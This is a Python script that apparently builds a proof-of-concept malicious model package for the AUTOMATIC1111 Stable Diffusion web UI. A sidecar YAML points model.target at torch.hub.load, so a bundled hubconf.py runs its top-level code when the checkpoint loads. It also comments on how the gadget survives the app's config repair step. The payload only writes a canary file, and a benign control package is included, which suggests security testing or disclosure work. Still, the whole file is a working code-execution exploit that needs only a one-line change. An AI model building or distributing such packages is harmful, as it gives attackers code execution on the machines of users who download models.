#!/usr/bin/env python3
"""Build the attacker's model package for root a1111.safetensors_yaml_target.

The attacker's ENTIRE capability is the content of example/artifact/ -- a model
package the victim downloads and unpacks into A1111's checkpoint directory.
Nothing else is placed on the victim machine, no Python runs on it, nothing is
imported by us.

Two packages are produced:

  mbe2e_pack/  (positive)   model.safetensors + model.yaml + hubconf.py
  mbe2e_neg/   (negative)   model.safetensors + model.yaml + hubconf.py
                            -- byte-identical except for model.yaml's `target`

Everything is written with official writer APIs (safetensors.torch.save_file).
Determinism: fixed tensor contents, fixed metadata, sorted JSON, LF newlines.
"""
import json
import pathlib
import hashlib

import torch
from safetensors.torch import save_file

HERE = pathlib.Path(__file__).resolve().parent
ART = HERE / "artifact"

CANARY_PATH = "/out/pwned_by_a1111_yaml_target"
CANARY_TOKEN = "MBE2E-CANARY-a1111-yaml-target-v1"

# ---------------------------------------------------------------- payload ---
# hubconf.py is an ordinary file inside the downloaded model package.  It is
# never executed by the victim directly; A1111 reaches it only because the
# sidecar YAML's `model.target` names torch.hub.load and its params name this
# directory.  Top-level module code runs the moment torch.hub imports it.
HUBCONF = (
    "# part of the attacker's model package\n"
    "import pathlib\n"
    f"pathlib.Path({CANARY_PATH!r}).write_text({CANARY_TOKEN!r} + chr(10))\n"
    "\n"
    "\n"
    "def build(**kwargs):\n"
    "    import types\n"
    "    return types.SimpleNamespace(mbe2e='model-package-controlled')\n"
)

# A1111 repair_config() injects model.params.use_ema=False before the callable is
# invoked (modules/sd_models.py:599-602), which breaks every strict-signature
# gadget such as subprocess.run/Popen.  torch.hub.load absorbs it through
# **kwargs and forwards it to the entry point, which is why this gadget survives
# the real product path instead of only a hand-called instantiate_from_config.
EVIL_YAML = (
    "model:\n"
    "  target: torch.hub.load\n"
    "  params:\n"
    "    repo_or_dir: models/Stable-diffusion/mbe2e_pack\n"
    "    model: build\n"
    "    source: local\n"
)

# Negative control: identical package, identical hubconf.py on disk, only the
# artifact-controlled `target` string is benign.
BENIGN_YAML = (
    "model:\n"
    "  target: torch.nn.Identity\n"
    "  params: {}\n"
)


def write_pack(name: str, yaml_text: str) -> None:
    d = ART / name
    d.mkdir(parents=True, exist_ok=True)
    tensors = {"mbe2e.weight": torch.zeros(4, dtype=torch.float32)}
    save_file(
        tensors,
        str(d / "model.safetensors"),
        metadata={"format": "pt", "mbe2e_pack": name},
    )
    (d / "model.yaml").write_text(yaml_text, encoding="utf-8", newline="\n")
    (d / "hubconf.py").write_text(HUBCONF, encoding="utf-8", newline="\n")


def main() -> None:
    ART.mkdir(parents=True, exist_ok=True)
    write_pack("mbe2e_pack", EVIL_YAML)
    write_pack("mbe2e_neg", BENIGN_YAML)

    manifest = {}
    for p in sorted(ART.rglob("*")):
        if p.is_file():
            manifest[str(p.relative_to(ART))] = {
                "sha256": hashlib.sha256(p.read_bytes()).hexdigest(),
                "size": p.stat().st_size,
            }
    blob = json.dumps(manifest, indent=2, sort_keys=True, ensure_ascii=False)
    (HERE / "artifact_manifest.json").write_text(blob + "\n", encoding="utf-8", newline="\n")
    print(blob)
    print("artifact_manifest_sha256",
          hashlib.sha256((blob + "\n").encode()).hexdigest())


if __name__ == "__main__":
    main()
